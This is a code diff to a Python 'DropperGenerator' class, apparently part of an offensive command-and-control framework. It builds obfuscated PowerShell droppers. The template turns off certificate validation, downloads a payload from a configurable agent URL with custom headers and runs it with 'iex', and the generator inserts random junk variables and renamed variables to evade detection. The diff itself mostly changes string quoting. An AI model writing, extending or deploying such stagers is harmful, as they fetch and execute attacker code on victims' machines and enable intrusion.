@@ -25,7 +25,7 @@ class DropperGenerator:
             return f"__STRING__{len(preserved_strings)}__"
             
         preserved_strings = []
-        pattern = r'"[^"]*"'
+        pattern = r'"[^"]*"|\'[^\']*\''
         
         processed_code = re.sub(pattern, lambda m: (preserved_strings.append(m.group(0)) or f"__STRING__{len(preserved_strings)-1}__"), code)
         
@@ -81,16 +81,16 @@ class DropperGenerator:
         template = '''[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 [System.Net.ServicePointManager]::CheckCertificateRevocationList = $false
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$global:agentUrl = "{{AGENT_URL}}"
-$global:deliveryUri = "{{DELIVERY_URI}}"
-$global:agentHost = "{{AGENT_HOST}}"
-$global:agentProt = "{{AGENT_PROTOCOL}}"
+$global:agentUrl = '{{AGENT_URL}}'
+$global:deliveryUri = '{{DELIVERY_URI}}'
+$global:agentHost = '{{AGENT_HOST}}'
+$global:agentProt = '{{AGENT_PROTOCOL}}'
 {{DROPPER_HEADERS}}
 ${{VAR_WEBCLIENT}} = New-Object System.Net.WebClient
 foreach ($headerKey in ${{VAR_HEADERS}}.Keys) {
     ${{VAR_WEBCLIENT}}.Headers.Add($headerKey, ${{VAR_HEADERS}}[$headerKey])
 }
-$fullUri = "$($global:agentProt)://$($global:agentUrl)$($global:deliveryUri)"
+$fullUri = $global:agentProt+'://'+$global:agentUrl+$global:deliveryUri
 ${{VAR_CONTENT}} = ${{VAR_WEBCLIENT}}.DownloadString($fullUri).Trim()
 ${{VAR_WEBCLIENT}}.Dispose()
 iex ${{VAR_CONTENT}}
@@ -110,7 +110,7 @@ iex ${{VAR_CONTENT}}
         for i in range(num_junk):
             var_name = self._generate_random_name("j", random.randint(4, 8))
             var_value = random.choice([
-                f'"{self._generate_random_name("", random.randint(8, 16))}"',
+                f"'{self._generate_random_name('', random.randint(8, 16))}'",
                 str(random.randint(1000, 9999)),
                 f'$env:{random.choice(["TEMP", "TMP", "USERNAME", "COMPUTERNAME", "PROCESSOR_ARCHITECTURE"])}'
             ])
@@ -249,42 +249,42 @@ iex ${{VAR_CONTENT}}
             headers_var = obfuscation_map.get('headers', 'headers')
 
             headers_dict = {
-                "Host": main_host,
-                "User-Agent": f'"{user_agent}"',
+                'Host': main_host,
+                'User-Agent': f"'{user_agent}'",
             }
 
             for header_line in request_headers:
                 if ':' in header_line:
                     key, value = header_line.split(':', 1)
                     key = key.strip()
-                    value = value.strip().strip('"')
+                    value = value.strip().strip('"').strip("'")
                     if key.lower() not in ('host', 'user-agent'):
-                        headers_dict[key] = f'"{value}"'
+                        headers_dict[key] = f"'{value}'"
 
             if not any(k.lower() == 'accept' for k in headers_dict):
-                headers_dict['Accept'] = '"*/*"'
-            
+                headers_dict['Accept'] = "'*/*'"
+
             ps_headers = f'${headers_var} = @{{\n'
             max_key_length = max(len(key) for key in headers_dict.keys())
-            
+
             for key, value in headers_dict.items():
                 padding = ' ' * (max_key_length - len(key) + 1)
-                if key == "Host":
-                    ps_headers += f'    "{key}"{padding}= $global:agentHost\n'
+                if key == 'Host':
+                    ps_headers += f"    '{key}'{padding}= $global:agentHost\n"
                 else:
-                    ps_headers += f'    "{key}"{padding}= {value}\n'
-            
+                    ps_headers += f"    '{key}'{padding}= {value}\n"
+
             ps_headers += '}'
             return ps_headers
-            
+
         except Exception as e:
             print(f"\033[91m[ERROR]\033[0m DROPPER GENERATOR - Error building obfuscated headers: {e}")
             headers_var = obfuscation_map.get('headers', 'headers')
-            return f'''${headers_var} = @{{
-    "Host"       = $global:agentHost
-    "User-Agent" = "{user_agent}"
-    "Accept"     = "*/*"
-}}'''
+            return f"""${headers_var} = @{{
+    'Host'       = $global:agentHost
+    'User-Agent' = '{user_agent}'
+    'Accept'     = '*/*'
+}}"""
     
     def get_dropper_stats(self):
         try:
